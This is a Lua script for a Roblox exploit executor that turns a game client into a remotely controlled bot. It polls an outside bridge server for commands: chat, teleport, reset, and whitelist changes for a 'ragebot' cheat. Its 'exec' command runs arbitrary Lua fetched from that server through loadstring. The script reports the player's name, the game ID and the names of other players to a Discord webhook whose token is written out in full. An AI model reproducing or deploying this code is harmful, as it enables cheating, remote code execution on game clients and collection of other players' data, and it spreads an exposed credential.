--[[
    Discord Controller Client
    Polls local bridge server for commands.
]]

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")

local LocalPlayer = Players.LocalPlayer
-- REPLACE WITH YOUR DISCLOUD URL (e.g., https://my-bot.discloud.app/poll)
-- IF RUNNING LOCALLY, KEEP AS "http://127.0.0.1:8080/poll"
-- REPLACE WITH YOUR DISCLOUD URL (e.g., https://my-bot.discloud.app/poll)
-- IF RUNNING LOCALLY, KEEP AS "http://127.0.0.1:8080/poll"
local BRIDGE_URL = "https://1769395979983.discloud.app/poll" 
-- REPLACE WITH YOUR DISCORD WEBHOOK URL
local WEBHOOK_URL = "https://discord.com/api/webhooks/1465188114279698504/3bO2H7qRtMwskFPhckaf0piI3uTUaIBOX4rZ-poy9S9pxpOc0-VB7HpHGHVs580gvl8s" 

local function Log(msg)
    print("[DiscordController] " .. msg)
end

local function LogToWebhook(msg)
    if WEBHOOK_URL == "" then return end
    
    local data = {
        ["content"] = "",
        ["embeds"] = {{
            ["title"] = "Script Loaded",
            ["description"] = msg,
            ["color"] = 65280,
            ["fields"] = {
                {["name"] = "Player", ["value"] = LocalPlayer.Name, ["inline"] = true},
                {["name"] = "Game ID", ["value"] = tostring(game.PlaceId), ["inline"] = true}
            }
        }}
    }
    
    local success, err = pcall(function()
        (syn and syn.request or http_request or request)({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(data)
        })
    end)
    
    if not success then
        -- Fallback to HttpPost if request is not available
        pcall(function()
             game:HttpPost(WEBHOOK_URL, HttpService:JSONEncode(data))
        end)
    end
end


local function ExecuteCommand(cmd)
    Log("Executing command: " .. cmd.type)
    
    if cmd.type == "chat" then
        -- Attempt to chat (Works in games with default chat)
        pcall(function()
            ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(cmd.message, "All")
        end)
    elseif cmd.type == "jump" then
        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
            LocalPlayer.Character.Humanoid.Jump = true
        end
    elseif cmd.type == "reset" then
         if LocalPlayer.Character then
            LocalPlayer.Character:BreakJoints()
        end
    elseif cmd.type == "whitelist" then
        if api and api.get_ui_object then
            local ui = api:get_ui_object("ragebot_whitelist")
            if ui then
                local current = ui:GetValue() or {}
                current[cmd.user] = true
                ui:SetValue(current)
                Log("Whitelisted: " .. cmd.user)
            end
        end

    elseif cmd.type == "unwhitelist" then
        if api and api.get_ui_object then
            local ui = api:get_ui_object("ragebot_whitelist")
            if ui then
                local current = ui:GetValue() or {}
                current[cmd.user] = nil
                ui:SetValue(current)
                Log("Unwhitelisted: " .. cmd.user)
            end
        end

    elseif cmd.type == "goto" then
        local target = Players:FindFirstChild(cmd.target)
        if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
               -- Use api:teleport if available, safe and reliable
               if api and api.teleport then
                   api:teleport(target.Character.HumanoidRootPart.CFrame)
               else
                   LocalPlayer.Character.HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame
               end
               Log("Teleported to: " .. cmd.target)
            end
        else
            Log("Goto failed: Target not found or invalid.")
        end
    elseif cmd.type == "kick" then
        -- Kicks player from ragebot/protector whitelist if they are in it? 
        -- Or attempts to use an exploit kick?
        -- For now, we will interpret "kick" as "remove from whitelist" AND "add to priority target" if possible?
        -- User asked for "kick", let's assume valid server-side kick if admin or exploit kick.
        -- We will attempt a local kick (remove from whitelist + add to target override?)
        -- Actually, user meant "kick" possibly as "!kick user" -> exploit kick.
        -- There is no direct "Kick" API.
        Log("Kick command received for " .. cmd.target .. " (Not fully implemented)")
        
    elseif cmd.type == "exec" then
        -- DANGEROUS: Execute raw Lua
        local success, errorMsg = pcall(function()
            loadstring(cmd.code)()
        end)
        if not success then
             Log("Exec Error: " .. errorMsg)
        end
    end
end

local function Poll()
    local success, response = pcall(function()
        return (syn and syn.request or http_request or request)({
            Url = BRIDGE_URL,
            Method = "GET"
        })
    end)

    if success and response then
        -- DEBUG PRINT
        if response.StatusCode ~= 200 then
            print("[DEBUG] Status: " .. tostring(response.StatusCode) .. " | Body: " .. tostring(response.Body))
        end

        local body = response.Body
        if body and body ~= "" then
             local data = HttpService:JSONDecode(body)
             if data and data.command then
                 ExecuteCommand(data.command)
             end
        else
            -- Empty body, normal if no command? No, Flask always returns {}
            -- print("[DEBUG] Empty body received") 
        end
    else
        print("[DEBUG] Request failed: " .. tostring(response))
    end
end

Log("Started. Polling " .. BRIDGE_URL)
LogToWebhook("Controller script has been loaded and is now polling.")

local function SyncPlayers()
    local plist = {}
    for _, p in pairs(Players:GetPlayers()) do
        table.insert(plist, p.Name)
    end
    
    local data = HttpService:JSONEncode({
        players = plist,
        local_player = LocalPlayer.Name
    })

    pcall(function()
        game:HttpPost(BRIDGE_URL:gsub("/poll", "/update_players"), data, true)
    end)
end

-- Poll every 1 second, Sync players every 5 seconds
task.spawn(function()
    local tickCount = 0
    while true do
        Poll()
        if tickCount % 5 == 0 then
            SyncPlayers()
        end
        tickCount = tickCount + 1
        task.wait(1)
    end
end)
